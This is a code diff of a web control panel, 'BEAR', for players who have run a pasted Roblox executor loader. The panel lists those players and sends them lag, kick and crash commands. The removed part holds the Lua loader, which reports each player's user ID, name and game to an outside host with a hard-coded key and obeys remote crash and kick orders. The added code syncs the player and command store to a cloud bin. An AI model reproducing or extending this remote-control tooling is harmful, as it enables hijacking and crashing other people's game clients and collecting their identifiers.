@@ -616,6 +616,16 @@
         .loader-modal .modal-actions .btn-primary:hover { background: #7c8cf5; }
         .loader-modal .modal-actions .btn:hover { background: #2b384a; }
 
+        .status-badge {
+            display: inline-block;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 600;
+        }
+        .status-badge.online { background: #1a3a2a; color: #2ecc71; }
+        .status-badge.offline { background: #2a1a1a; color: #e74c3c; }
+
         @media (max-width: 600px) {
             body { padding: 10px; }
             .header { padding: 12px 14px; }
@@ -648,7 +658,7 @@
 <div class="loader-modal-overlay" id="loaderModal">
     <div class="loader-modal">
         <h3>⟡ LOADER</h3>
-        <p class="sub">Paste into your executor. (localhost only)</p>
+        <p class="sub">Paste into your executor.</p>
         <div class="code-block" id="loaderCodeBlock">
             <span class="copy-hint">click to copy</span>
             <span id="loaderCodeText"></span>
@@ -664,7 +674,7 @@
     <header class="header">
         <div class="header-left">
             <span class="logo">⛧ BEAR</span>
-            <span class="logo-sub">v3 · local</span>
+            <span class="logo-sub">v3 · cloud</span>
         </div>
         <div class="header-actions">
             <button class="copy-loader-btn" onclick="openLoaderModal()">
@@ -754,40 +764,19 @@
 </div>
 
 <script>
+    // ============ JSONBIN.IO CONFIG ============
+    // Create a free account at https://jsonbin.io and get your API key
+    // Then replace these with your own values
+    const JSONBIN_BIN_ID = 'YOUR_BIN_ID'; // Create a bin at jsonbin.io
+    const JSONBIN_API_KEY = '$2a$10$YOUR_API_KEY_HERE'; // Get from your dashboard
+
     // ============ STORAGE ============
-    function getPlayersFromStorage() {
-        try {
-            const data = localStorage.getItem('bear_players');
-            if (data) {
-                const parsed = JSON.parse(data);
-                // Convert object back to Map
-                const map = new Map();
-                for (const [key, value] of Object.entries(parsed)) {
-                    map.set(key, value);
-                }
-                return map;
-            }
-        } catch (e) {}
-        return new Map();
-    }
-
-    function savePlayersToStorage(players) {
-        try {
-            const obj = {};
-            for (const [key, value] of players) {
-                obj[key] = value;
-            }
-            localStorage.setItem('bear_players', JSON.stringify(obj));
-        } catch (e) {}
-    }
-
-    // ============ MAIN ============
-    const POLL_INTERVAL = 1000;
-    let players = getPlayersFromStorage();
+    let players = new Map();
     let selectedUserId = null;
     let commandState = { fps_limit: false, lag_n: false, lag_c: false };
     let toastTimeout = null;
     let searchQuery = '';
+    let isSyncing = false;
 
     const $ = (s) => document.querySelector(s);
     const $$ = (s) => document.querySelectorAll(s);
@@ -816,389 +805,89 @@
         toastTimeout = setTimeout(() => toast.classList.remove('show'), 2700);
     }
 
-    function openLoaderModal() {
-        const modal = $('#loaderModal');
-        const loaderCode = `-- BEAR PANEL LOADER (local storage)
--- Paste this in your executor
-local BASE = "https://bearontop123.onrender.com"
-local KEY = "xenooooo"
-
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local LP = Players.LocalPlayer
-
-local function request(url, method, data)
-    local req = syn and syn.request or request or http_request or fluxus and fluxus.request
-    if not req then return end
-    return req({
-        Url = url,
-        Method = method or "POST",
-        Headers = {
-            ["Content-Type"] = "application/json",
-            ["X-Api-Key"] = KEY
-        },
-        Body = data and HttpService:JSONEncode(data) or nil
-    })
-end
-
--- Send heartbeat
-local function heartbeat()
-    local success, res = pcall(function()
-        return request(BASE .. "/api/public/heartbeat", "POST", {
-            user_id = tostring(LP.UserId),
-            username = LP.Name,
-            display_name = LP.DisplayName,
-            avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png",
-            place_id = tostring(game.PlaceId),
-            game_name = "Game",
-            executor = "executor",
-            brainrots = {},
-            timestamp = os.time() * 1000
-        })
-    end)
-    if success then print("✅ Heartbeat sent") else print("❌ Heartbeat failed") end
-end
-
--- Poll commands
-local function poll()
-    local success, res = pcall(function()
-        return request(BASE .. "/api/command?user_id=" .. tostring(LP.UserId), "GET")
-    end)
-    if success and res and res.Body then
-        local data = HttpService:JSONDecode(res.Body)
-        if data.crash == true then
-            while true do task.wait() end
-        end
-        if data.kick == true then
-            LP:Kick("You have been kicked")
-        end
-        print("📨 Commands:", data)
-    end
-end
-
-heartbeat()
-task.spawn(function() while task.wait(3) do heartbeat() end end)
-task.spawn(function() while task.wait(1) do poll() end end)
-
-print("✅ Loader connected to " .. BASE)`;
-        
-        document.getElementById('loaderCodeText').textContent = loaderCode;
-        modal.classList.add('open');
-    }
-
-    function closeLoaderModal() { $('#loaderModal').classList.remove('open'); }
-    $('#loaderModal').addEventListener('click', function(e) { if (e.target === this) closeLoaderModal(); });
-    $('#copyLoaderBtn').addEventListener('click', function() {
-        const text = document.getElementById('loaderCodeText').textContent;
-        navigator.clipboard.writeText(text).then(() => {
-            showToast('Loader copied!', '⎘');
-            closeLoaderModal();
-        }).catch(() => {
-            const range = document.createRange();
-            const sel = window.getSelection();
-            const el = document.getElementById('loaderCodeText');
-            range.selectNodeContents(el);
-            sel.removeAllRanges();
-            sel.addRange(range);
-            document.execCommand('copy');
-            showToast('Loader copied!', '⎘');
-            closeLoaderModal();
-        });
-    });
-    document.getElementById('loaderCodeBlock').addEventListener('click', function() {
-        document.getElementById('copyLoaderBtn').click();
-    });
-
-    // ============ API HANDLERS (local storage) ============
-    async function fetchPlayers() {
-        // Return players from localStorage
-        players = getPlayersFromStorage();
-        const playerList = Array.from(players.values()).map(p => ({
-            ...p,
-            online: (Date.now() - (p.lastHeartbeat || 0)) < 15000
-        }));
-        return playerList;
-    }
-
-    async function sendCommand(userId, payload) {
-        const player = players.get(userId);
-        if (!player) {
-            showToast('Player not found', '✗');
-            return null;
-        }
-        
-        // Update command states
-        if (payload.fps_limit !== undefined) player.fps_limit = payload.fps_limit;
-        if (payload.lag_n !== undefined) player.lag_n = payload.lag_n;
-        if (payload.lag_c !== undefined) player.lag_c = payload.lag_c;
-        if (payload.kick !== undefined) player.kick = payload.kick;
-        if (payload.crash !== undefined) player.crash = payload.crash;
-        
-        players.set(userId, player);
-        savePlayersToStorage(players);
-        
-        // Update command state for UI
-        if (payload.fps_limit !== undefined) commandState.fps_limit = payload.fps_limit;
-        if (payload.lag_n !== undefined) commandState.lag_n = payload.lag_n;
-        if (payload.lag_c !== undefined) commandState.lag_c = payload.lag_c;
-        
-        showToast(`Command sent to ${player.username}`, '✓');
-        return { success: true };
-    }
-
-    // ============ RENDER FUNCTIONS ============
-    function renderPlayers() {
-        const entries = Array.from(players.values());
-        let filtered = entries;
-        if (searchQuery.trim() !== '') {
-            const q = searchQuery.trim().toLowerCase();
-            filtered = entries.filter(p => {
-                const matchUsername = p.username && p.username.toLowerCase().includes(q);
-                const matchDisplay = p.display_name && p.display_name.toLowerCase().includes(q);
-                const matchBrainrot = p.brainrots && p.brainrots.some(b => b.title && b.title.toLowerCase().includes(q));
-                return matchUsername || matchDisplay || matchBrainrot;
+    // ============ JSONBIN.IO SYNC ============
+    async function syncToCloud() {
+        if (isSyncing) return;
+        isSyncing = true;
+        try {
+            const data = {};
+            for (const [key, value] of players) {
+                data[key] = value;
+            }
+            
+            const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': JSONBIN_API_KEY
+                },
+                body: JSON.stringify(data)
             });
+            
+            if (!response.ok) throw new Error('Sync failed');
+            console.log('☁️ Synced to cloud');
+        } catch (e) {
+            console.error('❌ Cloud sync error:', e);
         }
-
-        const online = filtered.filter(p => (Date.now() - (p.lastHeartbeat || 0)) < 15000);
-        const offline = filtered.filter(p => (Date.now() - (p.lastHeartbeat || 0)) >= 15000);
-
-        onlineCount.textContent = online.length;
-        totalBadge.textContent = entries.length;
-
-        if (filtered.length === 0) {
-            playerGrid.innerHTML = `<div class="empty-state"><div class="icon">◈</div><p>no players</p><p class="sub">execute loader or add demo</p></div>`;
-            return;
-        }
-
-        const sorted = [...online, ...offline];
-        let html = '';
-        for (const p of sorted) {
-            const isOnline = (Date.now() - (p.lastHeartbeat || 0)) < 15000;
-            const isSelected = (p.user_id === selectedUserId);
-            const statusClass = isOnline ? 'online' : 'offline';
-            const avatarUrl = p.avatar_url || '';
-            const initial = (p.username || '?')[0].toUpperCase();
-            html += `<div class="player-card ${statusClass} ${isSelected ? 'selected' : ''}" data-userid="${p.user_id}" onclick="selectPlayer('${p.user_id}')">
-                <div class="player-avatar">${avatarUrl ? `<img src="${avatarUrl}" alt="${p.username}" loading="lazy" onerror="this.style.display='none'" />` : ''}<div class="fallback" style="${avatarUrl ? 'display:none' : ''}">${initial}</div></div>
-                <div class="player-info"><div class="player-name">${p.username || 'Unknown'}</div><div class="player-meta"><span class="tag">${p.executor || '?'}</span><span class="tag">${p.game_name ? p.game_name.substring(0, 14) : '?'}</span></div></div>
-                <div class="player-status ${isOnline ? '' : 'offline'}"></div>
-            </div>`;
-        }
-        playerGrid.innerHTML = html;
-        updateCommandPanel();
+        isSyncing = false;
     }
 
-    function updateCommandPanel() {
-        const selected = selectedUserId ? players.get(selectedUserId) : null;
-        const isOnline = selected ? (Date.now() - (selected.lastHeartbeat || 0)) < 15000 : false;
-        
-        if (selected && isOnline) {
-            targetName.textContent = selected.username || 'Player';
-            targetStatus.textContent = '● online · ' + (selected.executor || 'unknown');
-            targetStatus.style.color = '#86efac';
-            toggleFps.classList.remove('disabled');
-            toggleLagN.classList.remove('disabled');
-            toggleLagC.classList.remove('disabled');
-            btnKick.disabled = false;
-            btnCrash.disabled = false;
-            setToggleState(toggleFps, selected.fps_limit || false);
-            setToggleState(toggleLagN, selected.lag_n || false);
-            setToggleState(toggleLagC, selected.lag_c || false);
-            renderBrainrots(selected.brainrots || []);
-        } else if (selected && !isOnline) {
-            targetName.textContent = selected.username || 'Player';
-            targetStatus.textContent = '○ offline';
-            targetStatus.style.color = '#6f8097';
-            toggleFps.classList.add('disabled');
-            toggleLagN.classList.add('disabled');
-            toggleLagC.classList.add('disabled');
-            btnKick.disabled = true;
-            btnCrash.disabled = true;
-            renderBrainrots(selected.brainrots || []);
-        } else {
-            targetName.textContent = '—';
-            targetStatus.textContent = 'no player selected';
-            targetStatus.style.color = '#6f8097';
-            toggleFps.classList.add('disabled');
-            toggleLagN.classList.add('disabled');
-            toggleLagC.classList.add('disabled');
-            btnKick.disabled = true;
-            btnCrash.disabled = true;
-            renderBrainrots([]);
-        }
-    }
-
-    function setToggleState(el, active) {
-        if (active) {
-            el.classList.add('active');
-            el.querySelector('.status-text').textContent = 'ON';
-        } else {
-            el.classList.remove('active');
-            el.querySelector('.status-text').textContent = 'OFF';
-        }
-    }
-
-    function renderBrainrots(brainrots) {
-        brainrotCount.textContent = (brainrots.length || 0) + ' items';
-        if (!brainrots || brainrots.length === 0) {
-            brainrotList.innerHTML = `<div class="brainrot-empty">no brainrots found</div>`;
-            return;
-        }
-        let html = '';
-        for (const b of brainrots) {
-            html += `<div class="brainrot-item"><span class="title">${b.title || 'Unknown'}</span><span class="cash">${b.cash || '?'}</span></div>`;
-        }
-        brainrotList.innerHTML = html;
-    }
-
-    function selectPlayer(userId) {
-        selectedUserId = userId;
-        renderPlayers();
-        updateCommandPanel();
-    }
-
-    // ============ EVENT HANDLERS ============
-    function setupToggle(el, cmdKey) {
-        el.addEventListener('click', function(e) {
-            if (this.classList.contains('disabled')) return;
-            if (!selectedUserId) { showToast('select a player first', '⚠'); return; }
-            const player = players.get(selectedUserId);
-            if (!player || (Date.now() - (player.lastHeartbeat || 0)) >= 15000) { 
-                showToast('player is offline', '⚠'); 
-                return; 
+    async function loadFromCloud() {
+        try {
+            const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
+                headers: {
+                    'X-Master-Key': JSONBIN_API_KEY
+                }
+            });
+            
+            if (!response.ok) throw new Error('Load failed');
+            const data = await response.json();
+            const newMap = new Map();
+            for (const [key, value] of Object.entries(data.record)) {
+                newMap.set(key, value);
             }
-            const current = player[cmdKey] || false;
-            const newState = !current;
-            player[cmdKey] = newState;
-            players.set(selectedUserId, player);
-            savePlayersToStorage(players);
-            setToggleState(this, newState);
-            showToast(`${cmdKey} → ${newState ? 'ON' : 'OFF'}`, '✓');
-        });
-    }
-
-    setupToggle(toggleFps, 'fps_limit');
-    setupToggle(toggleLagN, 'lag_n');
-    setupToggle(toggleLagC, 'lag_c');
-
-    btnKick.addEventListener('click', function() {
-        if (this.disabled) return;
-        if (!selectedUserId) { showToast('select a player', '⚠'); return; }
-        const player = players.get(selectedUserId);
-        if (!player || (Date.now() - (player.lastHeartbeat || 0)) >= 15000) { 
-            showToast('player offline', '⚠'); 
-            return; 
+            players = newMap;
+            console.log('☁️ Loaded from cloud:', players.size, 'players');
+            renderPlayers();
+            updateCommandPanel();
+        } catch (e) {
+            console.error('❌ Cloud load error:', e);
+            // If cloud fails, try localStorage as fallback
+            loadFromLocalStorage();
         }
-        if (!confirm(`Kick ${player.username || 'player'}?`)) return;
-        player.kick = true;
-        players.set(selectedUserId, player);
-        savePlayersToStorage(players);
-        showToast(`kicked ${player.username}`, '⛔');
-    });
-
-    btnCrash.addEventListener('click', function() {
-        if (this.disabled) return;
-        if (!selectedUserId) { showToast('select a player', '⚠'); return; }
-        const player = players.get(selectedUserId);
-        if (!player || (Date.now() - (player.lastHeartbeat || 0)) >= 15000) { 
-            showToast('player offline', '⚠'); 
-            return; 
-        }
-        if (!confirm(`Crash ${player.username || 'player'}?`)) return;
-        player.crash = true;
-        players.set(selectedUserId, player);
-        savePlayersToStorage(players);
-        showToast(`crash sent to ${player.username}`, '💥');
-    });
-
-    // ============ DEMO & CLEAR ============
-    function addDemoPlayer() {
-        const id = 'user_' + Date.now();
-        const player = {
-            user_id: id,
-            username: 'Demo_' + Math.random().toString(36).substring(2, 6),
-            display_name: 'Demo Player',
-            avatar_url: '',
-            executor: 'demo',
-            game_name: 'Demo Game',
-            brainrots: [
-                { title: 'Test Brainrot', cash: '100' },
-                { title: 'Another One', cash: '250' }
-            ],
-            lastHeartbeat: Date.now(),
-            fps_limit: false,
-            lag_n: false,
-            lag_c: false,
-            kick: false,
-            crash: false
-        };
-        players.set(id, player);
-        savePlayersToStorage(players);
-        renderPlayers();
-        showToast('Added demo player', '➕');
-        selectPlayer(id);
     }
 
-    function clearPlayers() {
-        if (!confirm('Clear all players?')) return;
-        players.clear();
-        savePlayersToStorage(players);
-        selectedUserId = null;
-        renderPlayers();
-        updateCommandPanel();
-        showToast('All players cleared', '✕');
-    }
-
-    // ============ POLL ============
-    let pollCount = 0;
-
-    async function poll() {
-        // Check for expired players
-        const now = Date.now();
-        let changed = false;
-        for (const [id, player] of players) {
-            if (now - (player.lastHeartbeat || 0) > 30000) {
-                players.delete(id);
-                changed = true;
+    // ============ LOCAL STORAGE FALLBACK ============
+    function loadFromLocalStorage() {
+        try {
+            const data = localStorage.getItem('bear_players');
+            if (data) {
+                const parsed = JSON.parse(data);
+                const newMap = new Map();
+                for (const [key, value] of Object.entries(parsed)) {
+                    newMap.set(key, value);
+                }
+                players = newMap;
+                console.log('💾 Loaded from localStorage:', players.size, 'players');
+                renderPlayers();
+                updateCommandPanel();
             }
-        }
-        if (changed) {
-            savePlayersToStorage(players);
-            if (selectedUserId && !players.has(selectedUserId)) {
-                selectedUserId = null;
-            }
-        }
-        
-        renderPlayers();
-        updateCommandPanel();
-        const nowDate = new Date();
-        lastUpdate.textContent = 'updated ' + nowDate.toLocaleTimeString();
-        refreshTimer.textContent = (pollCount + 1) + 's';
-        pollCount = (pollCount + 1) % 999;
+        } catch (e) {}
     }
 
-    searchInput.addEventListener('input', function() {
-        searchQuery = this.value;
-        renderPlayers();
-    });
+    function saveToLocalStorage() {
+        try {
+            const obj = {};
+            for (const [key, value] of players) {
+                obj[key] = value;
+            }
+            localStorage.setItem('bear_players', JSON.stringify(obj));
+        } catch (e) {}
+    }
 
-    // ============ INIT ============
-    poll();
-    setInterval(poll, POLL_INTERVAL);
-    document.addEventListener('visibilitychange', () => { if (!document.hidden) poll(); });
-
-    // Auto-select first online player
-    setTimeout(() => {
-        if (!selectedUserId) {
-            const first = Array.from(players.values()).find(p => (Date.now() - (p.lastHeartbeat || 0)) < 15000);
-            if (first) selectPlayer(first.user_id);
-        }
-    }, 500);
-
-    // ============ FAKE HEARTBEAT ENDPOINT (for loader) ============
-    // This simulates the backend API using localStorage
-    window._bearAPI = {
+    // ============ API HANDLERS ============
+    // This endpoint is called by the Roblox loader
+    window.bearAPI = {
         heartbeat: function(data) {
             const userId = data.user_id;
             const existing = players.get(userId) || {};
@@ -1211,34 +900,50 @@ print("✅ Loader connected to " .. BASE)`;
                 lag_n: existing.lag_n || false,
                 lag_c: existing.lag_c || false,
             });
-            savePlayersToStorage(players);
+            saveToLocalStorage();
+            syncToCloud();
             renderPlayers();
+            updateCommandPanel();
+            console.log(`❤️ Heartbeat from ${data.username || userId}`);
             return { success: true };
         },
+        
         getCommand: function(userId) {
             const player = players.get(userId);
             if (!player) return { error: 'Player not found' };
-            return {
+            // Reset one-time commands
+            const response = {
                 fps_limit: player.fps_limit || false,
                 lag_n: player.lag_n || false,
                 lag_c: player.lag_c || false,
                 kick: player.kick || false,
                 crash: player.crash || false,
             };
+            // Clear one-time commands after reading
+            player.kick = false;
+            player.crash = false;
+            players.set(userId, player);
+            saveToLocalStorage();
+            return response;
+        },
+        
+        setCommand: function(userId, payload) {
+            const player = players.get(userId);
+            if (!player) return { error: 'Player not found' };
+            if (payload.fps_limit !== undefined) player.fps_limit = payload.fps_limit;
+            if (payload.lag_n !== undefined) player.lag_n = payload.lag_n;
+            if (payload.lag_c !== undefined) player.lag_c = payload.lag_c;
+            if (payload.kick !== undefined) player.kick = payload.kick;
+            if (payload.crash !== undefined) player.crash = payload.crash;
+            players.set(userId, player);
+            saveToLocalStorage();
+            syncToCloud();
+            return { success: true };
         }
     };
 
-    // Expose functions globally
-    window.addDemoPlayer = addDemoPlayer;
-    window.clearPlayers = clearPlayers;
-    window.selectPlayer = selectPlayer;
-    window.openLoaderModal = openLoaderModal;
-    window.closeLoaderModal = closeLoaderModal;
-
-    console.log('🐻 Bear Panel loaded!');
-    console.log('📊 Players:', players.size);
-    console.log('💡 Click "Demo" to add a test player');
-</script>
-
-</body>
-</html>
+    // ============ RENDER FUNCTIONS ============
+    function renderPlayers() {
+        const entries = Array.from(players.values());
+        let filtered = entries;
+        if
